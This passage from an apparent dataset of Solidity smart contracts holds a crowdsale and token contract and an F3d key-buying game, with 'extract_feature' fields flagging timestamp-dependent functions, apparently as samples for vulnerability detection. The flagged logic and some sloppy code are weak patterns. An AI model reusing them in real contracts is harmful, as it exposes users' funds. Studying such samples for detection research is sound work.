JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract MintedTokenCappedCrowdsaleExt is CrowdsaleExt {\n uint public maximumSellableTokens;\n function MintedTokenCappedCrowdsaleExt(\n string _name,\n address _token,\n PricingStrategy _pricingStrategy,\n address _multisigWallet,\n uint _start, uint _end,\n uint _minimumFundingGoal,\n uint _maximumSellableTokens,\n bool _isUpdatable,\n bool _isWhiteListed\n ) CrowdsaleExt(_name, _token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal, _isUpdatable, _isWhiteListed) {\n maximumSellableTokens = _maximumSellableTokens;\n }\n event MaximumSellableTokensChanged(uint newMaximumSellableTokens);\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken) {\n return tokensSoldTotal > maximumSellableTokens;\n }\n function isBreakingInvestorCap(address addr, uint tokenAmount) public constant returns (bool limitBroken) {\n assert(isWhiteListed);\n uint maxCap = earlyParticipantWhitelist[addr].maxCap;\n return (tokenAmountOf[addr].plus(tokenAmount)) > maxCap;\n }\n function isCrowdsaleFull() public constant returns (bool) {\n return tokensSold >= maximumSellableTokens;\n }\n function setMaximumSellableTokens(uint tokens) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n maximumSellableTokens = tokens;\n MaximumSellableTokensChanged(maximumSellableTokens);\n }\n function updateRate(uint newOneTokenInWei) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n pricingStrategy.updateRate(newOneTokenInWei);\n }\n function assignTokens(address receiver, uint tokenAmount) private {\n MintableTokenExt mintableToken = MintableTokenExt(token);\n mintableToken.mint(receiver, tokenAmount);\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1ee9"
  },
  "filename": "2688.sol",
  "content": "pragma solidity ^0.4.24;\ncontract F3Devents {\n event Winner(address winner, uint256 pool, address revealer);\n event Buy(address buyer, uint256 keys, uint256 cost);\n event Sell(address from, uint256 price, uint256 count);\n event Bought(address buyer, address from, uint256 amount, uint256 price);\n}\ncontract F3d is F3Devents {\n using SafeMath for *;\n uint256 public a;\n uint256 public b;\n uint256 public ta;\n uint256 public tb;\n uint256 public tc;\n uint256 public td;\n uint256 public te;\n uint256 public wa;\n uint256 public wb;\n uint256 public wc;\n uint256 public wd;\n uint256 public we;\n uint256 public maxTimeRemain;\n uint256 public timeGap;\n uint256 public soldKeys;\n uint256 public decimals = 1000000;\n bool public pause;\n address public owner;\n address public admin;\n PlayerStatus[] public players;\n mapping(address => uint256) public playerIds;\n mapping(uint256 => Round) public rounds;\n mapping(uint256 => mapping (uint256 => PlayerRound)) public playerRoundData;\n uint256 public currentRound;\n struct PlayerStatus {\n address addr;\n uint256 wallet;\n uint256 affiliate;\n uint256 win;\n uint256 lrnd;\n uint256 referer;\n }\n struct PlayerRound {\n uint256 eth;\n uint256 keys;\n uint256 mask;\n }\n struct Round {\n uint256 eth;\n uint256 keys;\n uint256 mask;\n address winner;\n uint256 pool;\n uint256 endTime;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n modifier whenNotPaused() {\n require(!pause);\n _;\n }\n modifier onlyAdmin() {\n require(msg.sender == admin);\n _;\n }\n function setPause(bool _pause) onlyAdmin public {\n pause = _pause;\n }\n constructor(uint256 _a, uint256 _b,\n uint256 _ta, uint256 _tb, uint256 _tc, uint256 _td, uint256 _te,\n uint256 _wa, uint256 _wb, uint256 _wc, uint256 _wd, uint256 _we,\n uint256 _maxTimeRemain, uint256 _gap, address _owner) public {\n a = _a;\n b = _b;\n ta = _ta;\n tb = _tb;\n tc = _tc;\n td = _td;\n te = _te;\n wa = _wa;\n wb = _wb;\n wc = _wc;\n wd = _wd;\n we = _we;\n require(ta.add(tb).add(tc).add(td).add(te) == 1000);\n require(wa.add(wb).add(wc).add(wd).add(we) == 1000);\n owner = _owner;\n currentRound = 1;\n rounds[currentRound] = Round(0, 0, 0, owner, 0, block.timestamp.add(_maxTimeRemain));\n maxTimeRemain = _maxTimeRemain;\n timeGap = _gap;\n admin = msg.sender;\n players.push(PlayerStatus(\n owner,\n 0,\n 0,\n 0,\n 0,\n 0));\n }\n function Price(uint256 n) public view returns (uint256) {\n return n.mul(a).add(b);\n }\n function updatePlayer(uint256 _pID) private {\n if(players[_pID].lrnd != 0) {\n updateWallet(_pID, players[_pID].lrnd);\n }\n players[_pID].lrnd = currentRound;\n }\n function updateWallet(uint256 _pID, uint256 _round) private {\n uint256 earnings = calculateMasked(_pID, _round);\n if (earnings > 0) {\n players[_pID].wallet = earnings.add(players[_pID].wallet);\n playerRoundData[_pID][_round].mask = earnings.add(playerRoundData[_pID][_round].mask);\n }\n }\n function profit() public view returns (uint256) {\n uint256 id = playerIds[msg.sender];\n if (id == 0 && msg.sender != owner) {\n return 0;\n }\n PlayerStatus memory player = players[id];\n return player.wallet.add(player.affiliate).add(player.win).add(calculateMasked(id, player.lrnd));\n }\n function calculateMasked(uint256 _pID, uint256 _round) private view returns (uint256) {\n PlayerRound memory roundData = playerRoundData[_pID][_round];\n return rounds[_round].mask.mul(roundData.keys).sub(roundData.mask);\n }\n function registerUserIfNeeded(uint256 ref) public {\n if (msg.sender != owner) {\n if (playerIds[msg.sender] == 0) {\n playerIds[msg.sender] = players.length;\n if (ref >= players.length) {\n ref = 0;\n }\n players.push(PlayerStatus(\n msg.sender,\n 0,\n 0,\n 0,\n 0,\n ref));\n }\n }\n }\n function finalize(uint256 ref) public {\n Round storage lastOne = rounds[currentRound];\n require(block.timestamp > lastOne.endTime);\n registerUserIfNeeded(ref);\n currentRound = currentRound.add(1);\n Round storage _round = rounds[currentRound];\n _round.endTime = block.timestamp.add(maxTimeRemain);\n _round.winner = owner;\n uint256 money = lastOne.pool;\n if (money == 0) {\n return;\n }\n _round.pool = money.mul(wb) / 1000;\n uint256 toWinner = money.mul(wa) / 1000;\n players[playerIds[lastOne.winner]].win = toWinner.add(players[playerIds[lastOne.winner]].win);\n uint256 toRevealer = money.mul(wc) / 1000;\n uint256 revealId = playerIds[msg.sender];\n if (msg.sender == lastOne.winner) {\n revealId = 0;\n }\n players[revealId].win = players[revealId].win.add(toRevealer);\n uint256 toOwner = money.mul(wd) / 1000;\n players[0].win = players[0].win.add(toOwner);\n uint256 split = money.sub(_round.pool).sub(toWinner).sub(toRevealer).sub(toOwner);\n if (lastOne.keys != 0) {\n lastOne.mask = lastOne.mask.add(split / lastOne.keys);\n players[0].wallet = players[0].wallet.add(split.sub((split/lastOne.keys) * lastOne.keys));\n } else {\n _round.pool = split.add(_round.pool);\n }\n }\n function price(uint256 key) public view returns (uint256) {\n return a.mul(key).add(b);\n }\n function ethForKey(uint256 _keys) public view returns (uint256) {\n Round memory current = rounds[currentRound];\n uint256 c_key = (current.keys / decimals);\n if (c_key.mul(decimals) != current.keys) {\n c_key = c_key.add(1);\n }\n uint256 _price = price(c_key);\n uint256 remainKeys = c_key.mul(decimals).sub(current.keys);\n if (remainKeys >= _keys) {\n return _price.mul(_keys) / decimals;\n }\n uint256 costEth = _price.mul(_keys) / decimals;\n _keys = _keys.sub(remainKeys);\n while(_keys >= decimals) {\n c_key = c_key.add(1);\n _price = price(c_key);\n costEth = costEth.add(_price);\n _keys = _keys.sub(decimals);\n }\n c_key = c_key.add(1);\n _price = price(c_key);\n costEth = costEth.add(_price.mul(_keys) / decimals);\n return costEth;\n }\n function keys(uint256 _eth) public view returns (uint256) {\n Round memory current = rounds[currentRound];\n uint256 c_key = (current.keys / decimals).add(1);\n uint256 _price = price(c_key);\n uint256 remainKeys = c_key.mul(decimals).sub(current.keys);\n uint256 remain =remainKeys.mul(_price) / decimals;\n if (remain >= _eth) {\n return _eth.mul(decimals) / _price;\n }\n uint256 boughtKeys = remainKeys;\n _eth = _eth.sub(remain);\n while(true) {\n c_key = c_key.add(1);\n _price = price(c_key);\n if (_price <= _eth) {\n boughtKeys = boughtKeys.add(decimals);\n _eth = _eth.sub(_price);\n } else {\n boughtKeys = boughtKeys.add(_eth.mul(decimals) / _price);\n break;\n }\n }\n return boughtKeys;\n }\n function core(uint256 _round, uint256 _pID, uint256 _eth) internal {\n Round memory current = rounds[currentRound];\n if (playerRoundData[_pID][_round].keys == 0) {\n updatePlayer(_pID);\n }\n if (block.timestamp > current.endTime) {\n finalize(players[_pID].referer);\n updatePlayer(_pID);\n }\n Round storage current_now = rounds[currentRound];\n uint256 _keys = keys(_eth);\n if (_keys <= 0) {\n players[_pID].wallet = _eth.add(players[_pID].wallet);\n return;\n }\n if (_keys >= decimals) {\n current_now.winner = players[_pID].addr;\n current_now.endTime = current_now.endTime.add(timeGap);\n if (current_now.endTime.sub(block.timestamp) > maxTimeRemain) {\n current_now.endTime = block.timestamp.add(maxTimeRemain);\n }\n }\n uint256 toOwner = _eth.sub(_eth.mul(ta) / 1000);\n toOwner = toOwner.sub(_eth.mul(tb) / 1000);\n toOwner = toOwner.sub(_eth.mul(tc) / 1000);\n toOwner = toOwner.sub(_eth.mul(td) / 1000);\n current_now.pool = (_eth.mul(ta) / 1000).add(current_now.pool);\n if (current_now.keys == 0) {\n toOwner = toOwner.add((_eth.mul(tb) / 1000));\n players[0].wallet = toOwner.add(players[0].wallet);\n } else {\n current_now.mask = current_now.mask.add((_eth.mul(tb) / 1000) / current_now.keys);\n uint256 dust = (_eth.mul(tb) / 1000).sub( _eth.mul(tb) / 1000 / current_now.keys * current_now.keys );\n players[0].wallet = toOwner.add(dust).add(players[0].wallet);\n }\n playerRoundData[_pID][currentRound].keys = _keys.add(playerRoundData[_pID][currentRound].keys);\n current_now.keys = _keys.add(current_now.keys);\n current_now.eth = _eth.add(current_now.eth);\n playerRoundData[_pID][currentRound].mask = current_now.mask.mul(_keys).add(playerRoundData[_pID][currentRound].mask);\n uint256 referer1 = players[_pID].referer;\n uint256 referer2 = players[referer1].referer;\n players[referer1].affiliate = (_eth.mul(tc) / 1000).add(players[referer1].affiliate);\n players[referer2].affiliate = (_eth.mul(td) / 1000).add(players[referer2].affiliate);\n }\n function BuyKeys(uint256 ref) payable whenNotPaused public {\n registerUserIfNeeded(ref);\n core(currentRound, playerIds[msg.sender], msg.value);\n }\n function ReloadKeys(uint256 value, uint256 ref) whenNotPaused public {\n registerUserIfNeeded(ref);\n players[playerIds[msg.sender]].wallet = retrieveEarnings().sub(value);\n core(currentRound, playerIds[msg.sender], value);\n }\n function retrieveEarnings() internal returns (uint256) {\n uint256 id = playerIds[msg.sender];\n updatePlayer(id);\n PlayerStatus storage player = players[id];\n uint256 earnings = player.wallet.add(player.affiliate).add(player.win);\n if (earnings == 0) {\n return;\n }\n player.wallet = 0;\n player.affiliate = 0;\n player.win = 0;\n return earnings;\n }\n function withdrawal(uint256 ref) whenNotPaused public {\n registerUserIfNeeded(ref);\n uint256 earnings = retrieveEarnings();\n if (earnings == 0) {\n return;\n }\n msg.sender.transfer(earnings);\n }\n function playerCount() public view returns (uint256) {\n return players.length;\n }\n function register(uint256 ref) public whenNotPaused {\n registerUserIfNeeded(ref);\n }\n function remainTime() public view returns (uint256) {\n if (rounds[currentRound].endTime <= block.timestamp) {\n return 0;\n } else {\n return rounds[currentRound].endTime - block.timestamp;\n }\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b)\n internal\n pure\n returns (uint256 c)\n {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n require(c / a == b, \"SafeMath mul failed\");\n return c;\n }\n function sub(uint256 a, uint256 b)\n internal\n pure\n returns (uint256)\n {\n require(b <= a, \"SafeMath sub failed\");\n return a - b;\n }\n function add(uint256 a, uint256 b)\n internal\n pure\n returns (uint256 c)\n {\n c = a + b;\n require(c >= a, \"SafeMath add failed\");\n return c;\n }\n}",
  "extract_feature": [
    "function finalize(uint256 ref) public {\nRound storage lastOne = rounds[currentRound];\nrequire(block.timestamp > lastOne.endTime);\nregisterUserIfNeeded(ref);\ncurrentRound = currentRound.add(1);\nRound storage _round = rounds[currentRound];\n_round.endTime = block.timestamp.add(maxTimeRemain);\n_round.winner = owner;\nuint256 money = lastOne.pool;\nif (money == 0) {\nreturn;\n}\n_round.pool = money.mul(wb) / 1000;\nuint256 toWinner = money.mul(wa) / 1000;\nplayers[playerIds[lastOne.winner]].win = toWinner.add(players[playerIds[lastOne.winner]].win);\nuint256 toRevealer = money.mul(wc) / 1000;\nuint256 revealId = playerIds[msg.sender];\nif (msg.sender == lastOne.winner) {\nrevealId = 0;\n}\nplayers[revealId].win = players[revealId].win.add(toRevealer);\nuint256 toOwner = money.mul(wd) / 1000;\nplayers[0].win = players[0].win.add(toOwner);\nuint256 split = money.sub(_round.pool).sub(toWinner).sub(toRevealer).sub(toOwner);\nif (lastOne.keys != 0) {\nlastOne.mask = lastOne.mask.add(split / lastOne.keys);\nplayers[0].wallet = players[0].wallet.add(split.sub((split/lastOne.keys) * lastOne.keys));\n} else {\n_round.pool = split.add(_round.pool);\n}\n}",
    "function core(uint256 _round, uint256 _pID, uint256 _eth) internal {\nRound memory current = rounds[currentRound];\nif (playerRoundData[_pID][_round].keys == 0) {\nupdatePlayer(_pID);\n}\nif (block.timestamp > current.endTime) {\nfinalize(players[_pID].referer);\nupdatePlayer(_pID);\n}\nRound storage current_now = rounds[currentRound];\nuint256 _keys = keys(_eth);\nif (_keys <= 0) {\nplayers[_pID].wallet = _eth.add(players[_pID].wallet);\nreturn;\n}\nif (_keys >= decimals) {\ncurrent_now.winner = players[_pID].addr;\ncurrent_now.endTime = current_now.endTime.add(timeGap);\nif (current_now.endTime.sub(block.timestamp) > maxTimeRemain) {\ncurrent_now.endTime = block.timestamp.add(maxTimeRemain);\n}\n}\nuint256 toOwner = _eth.sub(_eth.mul(ta) / 1000);\ntoOwner = toOwner.sub(_eth.mul(tb) / 1000);\ntoOwner = toOwner.sub(_eth.mul(tc) / 1000);\ntoOwner = toOwner.sub(_eth.mul(td) / 1000);\ncurrent_now.pool = (_eth.mul(ta) / 1000).add(current_now.pool);\nif (current_now.keys == 0) {\ntoOwner = toOwner.add((_eth.mul(tb) / 1000));\nplayers[0].wallet = toOwner.add(players[0].wallet);\n} else {\ncurrent_now.mask = current_now.mask.add((_eth.mul(tb) / 1000) / current_now.keys);\nuint256 dust = (_eth.mul(tb) / 1000).sub( _eth.mul(tb) / 1000 / current_now.keys * current_now.keys );\nplayers[0].wallet = toOwner.add(dust).add(players[0].wallet);\n}\nplayerRoundData[_pID][currentRound].keys = _keys.add(playerRoundData[_pID][currentRound].keys);\ncurrent_now.keys = _keys.add(current_now.keys);\ncurrent_now.eth = _eth.add(current_now.eth);\nplayerRoundData[_pID][currentRound].mask = current_now.mask.mul(_keys).add(playerRoundData[_pID][currentRound].mask);\nuint256 referer1 = players[_pID].referer;\nuint256 referer2 = players[referer1].referer;\nplayers[referer1].affiliate = (_eth.mul(tc) / 1000).add(players[referer1].affiliate);\nplayers[referer2].affiliate = (_eth.mul(td) / 1000).add(players[referer2].affiliate);\n}",
    "function remainTime() public view returns (uint256) {\nif (rounds[currentRound].endTime <= block.timestamp) {\nreturn 0;\n} else {\nreturn rounds[currentRound].endTime - block.timestamp;\n}\n}"
  ]
},
